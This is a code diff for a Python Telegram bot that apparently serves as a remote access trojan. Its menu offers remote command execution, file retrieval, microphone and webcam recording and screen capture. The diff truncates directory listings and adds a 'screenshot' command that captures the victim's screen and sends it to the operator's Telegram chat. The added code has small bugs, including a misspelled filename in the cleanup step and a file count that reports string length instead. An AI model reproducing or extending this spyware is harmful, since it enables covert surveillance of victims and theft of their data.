@@ -54,7 +54,10 @@ class Client:
         markup = ReplyKeyboardMarkup()
         list_files = os.listdir(os.getcwd())
 
-        [markup.add(i) for i in list_files]
+        if len(list_files) >= 230:
+            [markup.add(i) for i in list_files[0:228]]
+        else:
+            [markup.add(i) for i in list_files]
         markup.add("EXIT")
         return markup
 
@@ -82,9 +85,16 @@ class Client:
 
         elif ms.text == "dir":
             try:
-                output = "\n".join(os.listdir())
-                if output:
+                output = os.listdir()
+                if len(output) >= 230:
+                    output = "\n".join(output[0:230])
                     bot.send_message(ms.chat.id, output, reply_markup=markup)
+                    bot.send_message(ms.chat.id, f"The first 230 elements are derived from {len(output)}", reply_markup=markup)
+                    
+                elif output:
+                    output = "\n".join(output)
+                    bot.send_message(ms.chat.id, output, reply_markup=markup)
+                    
                 else:
                     bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
             except Exception as e:
@@ -144,6 +154,17 @@ class Client:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, get_file_next)
+
+
+        elif ms.text == "screenshot":
+            myScreenshot = pyautogui.screenshot()
+            myScreenshot.save("screenshot.jpg")
+            
+            with open("screenshot.jpg", "rb") as photo:
+                bot.send_photo(ms.chat.id, photo)
+            
+            time.sleep(1)
+            os.remove("sreenshot.jpg")
 
 
         elif ms.text == "record_audio":
@@ -355,7 +376,9 @@ class Client:
 
 """ Variables """
 API_TOKEN = "token"
+
 ADMIN_ID = id
+
 bot = TeleBot(API_TOKEN)
 
 markup = ReplyKeyboardMarkup(True, True)
@@ -364,8 +387,8 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
         KeyboardButton("record_audio"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
-        KeyboardButton("get_screen"))
-
+        KeyboardButton("get_screen"), KeyboardButton("screenshot"))
+ 
 """ Start """
 client = Client()
 bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
